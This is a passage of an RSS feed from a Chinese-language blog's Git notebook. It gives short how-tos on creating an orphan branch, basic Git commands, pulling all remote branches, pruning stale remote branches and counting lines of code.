      <link>https://www.geekery.cn/note-book/Git/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%A9%BA%E5%88%86%E6%94%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%A9%BA%E5%88%86%E6%94%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git创建一个空分支</source>
      <description>Git创建一个空分支 创建新分支 打开你的命令行界面（比如终端或Git Bash），进入你的Git仓库所在的目录。 在这个命令中，&amp;lt;branch-name&amp;gt; 是你想要创建的新分支的名称。 清空工作区 在新分支上，你可能希望清空所有文件，以确保它是一个空的分支。 这会删除当前分支下的所有文件。 提交更改 提交清空工作区后的更改。 现在，你就创建了一个无根...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>创建新分支</h2>
<p>打开你的命令行界面（比如终端或Git Bash），进入你的Git仓库所在的目录。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --orphan</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">branch-nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在这个命令中，<code>&lt;branch-name&gt;</code> 是你想要创建的新分支的名称。</p>
<h2>清空工作区</h2>
<p>在新分支上，你可能希望清空所有文件，以确保它是一个空的分支。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这会删除当前分支下的所有文件。</p>
<h2>提交更改</h2>
<p>提交清空工作区后的更改。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> commit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Initial commit"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>现在，你就创建了一个无根的空的新分支，可以在这个分支上开始新的工作了。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Git基础命令</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git基础命令</source>
      <description>Git基础命令 Git 基本操作 Git 的工作就是创建和保存你项目的快照及与之后的快照进行对比。 本章将对有关创建与提交你的项目快照的命令作介绍。 Git 常用的是以下 6 个命令：git clone、git push、git add 、git commit、git checkout、git pull，后面我们会详细介绍。 说明： workspace...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Git 基本操作</h2>
<p>Git 的工作就是创建和保存你项目的快照及与之后的快照进行对比。</p>
<p>本章将对有关创建与提交你的项目快照的命令作介绍。</p>
<p>Git 常用的是以下 6 个命令：<strong>git clone</strong>、<strong>git push</strong>、<strong>git add</strong> 、<strong>git commit</strong>、<strong>git checkout</strong>、<strong>git pull</strong>，后面我们会详细介绍。</p>
<p><strong>说明：</strong></p>
<ul>
<li>workspace：工作区</li>
<li>staging area：暂存区/缓存区</li>
<li>local repository：版本库或本地仓库</li>
<li>remote repository：远程仓库</li>
</ul>
<p>一个简单的操作步骤：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> commit</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li>git init - 初始化仓库。</li>
<li>git add .  -  添加文件到暂存区。</li>
<li>git commit  -  将暂存区内容添加到仓库中。</li>
</ul>
<h3>创建仓库命令</h3>
<p>下表列出了 git 创建仓库的命令：</p>
<p>| 命令         | 说明                                   |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Git基础技巧</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E5%9F%BA%E7%A1%80%E6%8A%80%E5%B7%A7.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E5%9F%BA%E7%A1%80%E6%8A%80%E5%B7%A7.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git基础技巧</source>
      <description>Git基础技巧 这里是我的笔记，记录一些 git 常用和一些记不住的命令，这个笔记原本是基于 颜海镜的文章增加的，后面慢慢增加了许多内容，独立一个仓库维护，方便查询和使用。 安装卸载 官方教程，在 Linux/Unix 系统中，通过工具在中安装 git,这种方式比较简单，便于升级卸载工具。 下面介绍在 CentOS 系统中，通过 yum 来安装 git...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>Git拉取全部远程分支</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E6%8B%89%E5%8F%96%E5%85%A8%E9%83%A8%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E6%8B%89%E5%8F%96%E5%85%A8%E9%83%A8%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git拉取全部远程分支</source>
      <description>Git拉取全部远程分支 命令</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>命令</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">-r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">`</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">basename</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">`</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --all</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Git更新远程分支</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E6%9B%B4%E6%96%B0%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E6%9B%B4%E6%96%B0%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git更新远程分支</source>
      <description>Git更新远程分支 同事创建出新的分支后，我这边用sourcetree刷新，始终看不到最新的。上网查了一下，可以用命令刷新，刷新之后就可以看到新创建的分支了。 或者 img</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>同事创建出新的分支后，我这边用sourcetree刷新，始终看不到最新的。上网查了一下，可以用命令刷新，刷新之后就可以看到新创建的分支了。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> remote</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> origin</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --prune</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>或者</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> remote</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> origin</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Git统计项目代码行数</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E7%BB%9F%E8%AE%A1%E9%A1%B9%E7%9B%AE%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E7%BB%9F%E8%AE%A1%E9%A1%B9%E7%9B%AE%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git统计项目代码行数</source>
      <description>Git统计项目代码行数 只统计项目代码的总行数 只查看项目文件列表 统计python代码的行数</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>只统计项目代码的总行数</h2>
<div class="language-ruby line-numbers-mode" data-highlighter="shiki" data-ext="ruby" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-ruby"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">git ls</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">files </span><span style="--shiki-light:#50A14F;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xargs cat </span><span style="--shiki-light:#50A14F;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> wc </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">l</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>只查看项目文件列表</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls-files</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>统计python代码的行数</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls-files</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '.*\.py'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">xargs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -l</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
  </channel>
</rss>